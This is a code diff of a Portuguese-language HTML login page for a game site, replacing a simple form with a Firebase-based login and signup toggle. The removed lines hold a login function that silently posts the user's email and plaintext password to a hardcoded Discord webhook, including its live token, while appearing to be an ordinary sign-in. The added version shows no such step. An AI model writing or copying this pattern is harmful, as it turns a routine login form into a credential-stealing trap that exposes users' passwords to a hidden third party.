@@ -1,61 +1,49 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Login - Ultimate Ninja</title>
+  <meta charset="UTF-8" />
+  <title>Login - NinjaLabs</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+  <script src="firebase-config.js"></script>
+  <script src="script.js" defer></script>
   <style>
-    body {
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 60px;
-    }
-    input {
-      padding:10px;
-      margin:10px;
-      width:250px;
-      border:none;
-      border-radius:4px;
-    }
-    button {
-      padding:10px 20px;
-      background:#e60000;
-      color:white;
-      border:none;
-      border-radius:4px;
-      cursor:pointer;
-    }
+    body { background:#111; color:white; font-family:sans-serif; padding:40px; }
+    .container { max-width:400px; margin:0 auto; background:#222; padding:30px; border-radius:10px; }
+    input, button { width:100%; padding:10px; margin:10px 0; border:none; border-radius:5px; }
+    input { background:#333; color:white; }
+    button { background:#e60000; color:white; font-weight:bold; cursor:pointer; }
+    .toggle { text-align:center; margin-top:10px; color:#aaa; cursor:pointer; }
   </style>
 </head>
 <body>
-  <h1>Login</h1>
-  <input type="email" id="email" placeholder="E-mail" /><br>
-  <input type="password" id="senha" placeholder="Senha" /><br>
-  <button onclick="logar()">Entrar</button>
-  <p>Não tem conta? <a href="cadastro.html" style="color:#ff4444;">Cadastre-se</a></p>
+  <div class="container">
+    <h2 id="formTitle">Login</h2>
+    <input type="email" id="email" placeholder="Email" required />
+    <input type="password" id="senha" placeholder="Senha" required />
+    <button onclick="login()">Entrar</button>
+    <p class="toggle" onclick="switchForm()">Não tem conta? Cadastre-se</p>
+    <p id="msg" style="color:red;text-align:center;"></p>
+  </div>
 
   <script>
-    function logar() {
-      const email = document.getElementById('email').value.trim();
-      const senha = document.getElementById('senha').value.trim();
-
-      if(!email || !senha) {
-        alert("Preencha todos os campos.");
-        return;
+    let isLogin = true;
+    function switchForm() {
+      const btn = document.querySelector("button");
+      const title = document.getElementById("formTitle");
+      const toggle = document.querySelector(".toggle");
+      if (isLogin) {
+        btn.innerText = "Cadastrar";
+        title.innerText = "Cadastro";
+        btn.setAttribute("onclick", "cadastrar()");
+        toggle.innerText = "Já tem conta? Faça login";
+      } else {
+        btn.innerText = "Entrar";
+        title.innerText = "Login";
+        btn.setAttribute("onclick", "login()");
+        toggle.innerText = "Não tem conta? Cadastre-se";
       }
-
-      localStorage.setItem("usuarioLogado", JSON.stringify({email}));
-
-      fetch("https://discord.com/api/webhooks/1393993052779057325/NmwZO-InnSFyh-a5iavSqY9yjwef3vYatX1FLE2J91ZNdd_yqRcw0DO0g7eS7WwGbl0h", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          content: `✅ **Novo Login**\n📧 Email: ${email}\n🔑 Senha: ${senha}`
-        })
-      });
-
-      window.location.href = "index.html";
+      isLogin = !isLogin;
     }
   </script>
 </body>
